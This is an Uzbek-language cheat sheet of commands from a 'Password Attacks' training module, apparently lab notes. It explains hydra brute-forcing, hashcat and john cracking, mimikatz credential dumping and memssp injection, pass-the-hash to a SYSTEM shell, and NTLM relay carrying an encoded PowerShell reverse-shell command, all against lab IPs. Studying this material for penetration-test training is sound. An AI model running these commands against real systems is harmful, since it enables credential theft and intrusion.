# 16. Password Attacks — Amaliy Asboblar va Flaglar Qo'llanmasi

Ushbu qo'llanma **"16. Password Attacks"** modulidagi barcha amaliy buyruqlar, ishlatilgan asboblar (tools) va ularning har bir flag'i (parametri) vazifasi bo'yicha to'liq amaliy chetsheet shaklida tayyorlandi.

---

## 1. HYDRA (`hydra`) — Tarmoq xizmatlariga onlayn parol hujumi

### A. SSH Dictionary Attack
```bash
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```
* `-l george` — Nishondagi bitta aniq foydalanuvchi nomini bildiradi.
* `-P /usr/share/wordlists/rockyou.txt` — Parollar lug'ati (wordlist) fayli yo'li.
* `-s 2222` — Standart bo'lmagan port raqami (SSH odatda 22-port, bu yerda 2222).
* `ssh://192.168.50.201` — Hujum qilinayotgan protokol va nishon IP manzili.

---

### B. RDP Password Spraying
```bash
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```
* `-L names.txt` — Foydalanuvchilar ro'yxati fayli (ko'p foydalanuvchilarni ketma-ket tekshirish).
* `-p "SuperS3cure1337#"` — Bitta aniq parol (barcha foydalanuvchilarga bitta parolni sinab, bloklanishdan qochish — Spraying).
* `rdp://192.168.50.202` — Remote Desktop Protocol xizmati va nishon IP.

---

### C. HTTP POST Form Attack (Veb-sayt login formasi)
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```
* `-l user` — Veb formadagi foydalanuvchi nomi.
* `-P rockyou.txt` — Parollar lug'ati.
* `192.168.50.201` — Veb-server IP manzili.
* `http-post-form` — HTTP POST formasi moduli.
* `"/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"` — Uch qismdan iborat sintaksis:
  1. `/index.php` — So'rov yuboriladigan sahifa yo'li.
  2. `fm_usr=user&fm_pwd=^PASS^` — POST body qismi. `^PASS^` o'rniga Hydra lug'atdagi parollarni qo'yadi (agar login ham ro'yxat bo'lsa `^USER^` ishlatiladi).
  3. `Login failed. Invalid` — Noto'g'ri parol kiritilganda sahifada paydo bo'ladigan xatolik matni (False condition).

---

## 2. HASHCAT (`hashcat`) — GPU/CPU orqali hash buzish

### A. Uskunani sinash (Benchmark)
```bash
hashcat -b
hashcat -b -m 0,1000,1400
```
* `-b` — Benchmark rejimi (CPU/GPU har bir algoritmda sekundiga qancha hash hisoblay olishini tekshiradi).
* `-m 0,1000,1400` — Faqat tanlangan hash turlarini tekshirish (0=MD5, 1000=NTLM, 1400=SHA2-256).

---

### B. Qoidalarni tekshirish (Rule Debugging)
```bash
hashcat -r demo.rule --stdout demo.txt
```
* `-r demo.rule` — Mutatsiya qoidalari fayli.
* `--stdout` — Hashni buzmasdan, qoidalar natijasida hosil bo'lgan parollar ro'yxatini to'g'ridan-to'g'ri terminalga chiqarish.
* `demo.txt` — Sinov uchun olingan bazaviy so'zlar fayli.

---

### C. MD5 Hashni qoidalar bilan buzish
```bash
hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
```
* `-m 0` — Hash turi: `0 = MD5`.
* `crackme.txt` — Buzilishi kerak bo'lgan hash saqlangan fayl.
* `/usr/share/wordlists/rockyou.txt` — Asosiy lug'at fayli.
* `-r demo3.rule` — Lug'atga qo'llanadigan mutatsiya qoidalari fayli.
* `--force` — Uskuna va drayver ogohlantirishlarini e'tiborsiz qoldirib majburiy ishga tushirish.

---

### D. KeePass (`.kdbx`) ma'lumotlar bazasi hashini buzish
```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```
* `-m 13400` — Hash turi: `13400 = KeePass 1 (AES/Twofish) and KeePass 2 (AES)`.
* `keepass.hash` — `keepass2john` orqali chiqarib olingan hash fayli.
* `-r rockyou-30000.rule` — Hashcat ichidagi eng mashhur 30,000 ta mutatsiya qoidasi.

---

### E. Windows NTLM Hashni buzish
```bash
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
* `-m 1000` — Hash turi: `1000 = NTLM`.
* `nelly.hash` — SAM yoki LSASS'dan olingan 32 belgili NTLM hash.
* `-r best64.rule` — Eng ko'p natija beruvchi 64 ta tezkor mutatsiya qoidasi.

---

### F. Net-NTLMv2 (Tarmoqda tutib olingan hash)ni buzish
```bash
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```
* `-m 5600` — Hash turi: `5600 = Net-NTLMv2 / NetNTLMv2`.
* `paul.hash` — Responder tomonidan tutib olingan to'liq challenge-response hash qatori.

---

## 3. MUTATSIYA QOIDALARI SINTAKSISI (Rule Syntax)

Lug'atdagi so'zlarni avtomatik o'zgartirish uchun qoidalar (`.rule` fayllar):
* `$1` — So'z oxiriga `1` belgisini qo'shish (masalan: `password` $\rightarrow$ `password1`).
* `^!` — So'z boshiga `!` belgisini qo'shish (masalan: `password` $\rightarrow$ `!password`).
* `c` — Birinchi harfni katta qilish (capitalize) (masalan: `password` $\rightarrow$ `Password`).
* `u` — Barcha harflarni katta qilish (uppercase).
* `l` — Barcha harflarni kichik qilish (lowercase).
* `c $1 $!` — Birgalikda qo'llash: birinchi harfni katta qiladi, oxiriga `1` va `!` qo'shadi (`Password1!`).

---

## 4. JOHN THE RIPPER (`john`) VA HASH AJRATUVCHILAR

### A. KeePass bazasidan hash ajratish
```bash
keepass2john Database.kdbx > keepass.hash
```
* `Database.kdbx` faylidagi master-kalit hashini ajratadi.
* *Eslatma:* Hashcat'da ishlatish uchun fayl boshidagi `Database:` prefiksini o'chirib tashlash kerak.

---

### B. SSH Private Key'dan hash ajratish va buzish
```bash
# 1. Hashni ajratish
ssh2john id_rsa > ssh.hash

# 2. Qoidani /etc/john/john.conf ga qo'shish
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'

# 3. John bilan buzish
john --wordlist=ssh.passwords --rules=sshRules ssh.hash

# 4. Natijani ko'rish
john --show ssh.hash
```
* `ssh2john id_rsa` — Shifrlangan SSH shaxsiy kaliti paroli hashini chiqaradi.
* `--wordlist=ssh.passwords` — Parollar lug'ati fayli.
* `--rules=sshRules` — `john.conf` fayliga yozilgan maxsus qoida nomi.
* `--show` — Buzilgan parolni ekranga chiqaradi.

---

## 5. MIMIKATZ (`mimikatz.exe`) — Windows xotirasi va reestri bilan ishlash

Administrator huquqidagi terminalda (`C:\tools\mimikatz\mimikatz.exe`):

```powershell
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
mimikatz # sekurlsa::logonpasswords
mimikatz # misc::memssp
```
* `privilege::debug` — `SeDebugPrivilege` huquqini faollashtiradi (boshqa tizim jarayonlari xotirasini ochish uchun shart).
* `token::elevate` — Joriy tokenni eng yuqori `NT AUTHORITY\SYSTEM` darajasiga ko'taradi.
* `lsadump::sam` — SAM (Security Account Manager) reestridan barcha **lokal** foydalanuvchilarning NTLM hashlarini oladi.
* `sekurlsa::logonpasswords` — `lsass.exe` jarayoni xotirasidan barcha faol sessiyalarning ochiq parollari, NTLM hashlarini chiqaradi.
* `misc::memssp` — **Credential Guard'ni chetlab o'tish:** LSASS xotirasiga zararli SSP drayverini inyeksiya qiladi. Yangi kiruvchi foydalanuvchilarning ochiq parollarini `C:\Windows\System32\mimilsa.log` fayliga avtomatik yozib boradi.

---

## 6. PASS-THE-HASH ASBOBLARI (IMPACKET & SMBCLIENT)

Matnli parolsiz, faqat NTLM hash orqali masofaviy tizimga ulanish:

### A. SMB orqali fayl ulashishga kirish (`smbclient`)
```bash
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```
* `\\\\192.168.50.212\\secrets` — Nishon SMB ulashmasi yo'li.
* `-U Administrator` — Foydalanuvchi nomi.
* `--pw-nt-hash <hash>` — Parol o'rniga to'g'ridan-to'g'ri 32 belgili NTLM hashni uzatish.

---

### B. SYSTEM Shell olish (`impacket-psexec`)
```bash
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```
* `-hashes <LM:NTLM>` — LM va NTLM hash juftligi (LM yo'qligi sababli 32 ta nol qo'yiladi).
* `Administrator@192.168.50.212` — Nishon foydalanuvchi va server IP.
* *Natija:* Nishonda vaqtinchalik xizmat yaratib, to'g'ridan-to'g'ri `NT AUTHORITY\SYSTEM` interaktiv shell ochadi.

---

### C. WMI orqali buyruq bajarish (`impacket-wmiexec`)
```bash
impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248
```
* `-hashes <LM:NTLM>` — NTLM hash formati.
* `-debug` — Ulanish jarayonidagi nosozliklar tafsilotini ko'rsatish (verbose).
* `CORP/Administrator@IP` — Windows Domen nomi va foydalanuvchi.
* *Afzalligi:* Xizmat yaratmaydi, WMI orqali ishlaydi (kamroq iz qoldiradi).

---

## 7. RESPONDER VA NTLM RELAY (`ntlmrelayx`)

### A. Net-NTLMv2 hashini tarmoqda tutib olish (`responder`)
```bash
sudo responder -I tap0 -v
```
* `-I tap0` — Tinglanadigan tarmoq interfeysi nomi (VPN tuneli yoki lokal adapter).
* `-v` — Verbose rejimi (hash kelganda uni ekranga to'liq chiqarish).
* *Qurbon tomondan chaqirish:* `dir \\192.168.119.2\test` buyrug'i berilsa, Windows avtomatik ravishda Kali'ga Net-NTLMv2 autentifikatsiya so'rovini jo'natadi.

---

### B. Net-NTLMv2 Relay hujumi (`impacket-ntlmrelayx`)
```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
```
* `-t 192.168.50.212` — Tutib olingan autentifikatsiya yo'naltiriladigan (relay qilinadigan) boshqa nishon server.
* `-c "<buyruq>"` — Autentifikatsiya muvaffaqiyatli relay bo'lgach, nishon serverda admin huquqi bilan bajariladigan buyruq (masalan, Base64 formatidagi powershell reverse shell).
* `-smb2support` — SMBv2 protokolidagi ulanishlarni qo'llab-quvvatlash.
* `--no-http-server` — HTTP serverni o'chirib, faqat SMB ulanishlariga e'tibor qaratish.

---

## 8. XFREERDP (`xfreerdp`) — Masofaviy ish stoliga ulanish

```bash
xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.246 /dynamic-resolution
```
* `/u:"CORP\\Administrator"` — Domen va foydalanuvchi nomi.
* `/p:"QWERTY123\!@#"` — Foydalanuvchi paroli (maxsus belgilardan oldin `\` qo'yiladi).
* `/v:192.168.50.246` — Nishon RDP server IP manzili.
* `/dynamic-resolution` — Oyna o'lchami o'zgarganda ekranni moslashtirish.

---

## 9. WINDOWS ENUMERATION BUYRUQLARI (Modulda ishlatilgan)

```powershell
# 1. Barcha diskdan KeePass bazalarini qidirish
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# 2. Tizimdagi lokal foydalanuvchilar ro'yxati
Get-LocalUser

# 3. Credential Guard va tizim ma'lumotlarini tekshirish
Get-ComputerInfo

# 4. memssp ushlagan ochiq parollar faylini o'qish
type C:\Windows\System32\mimilsa.log
```
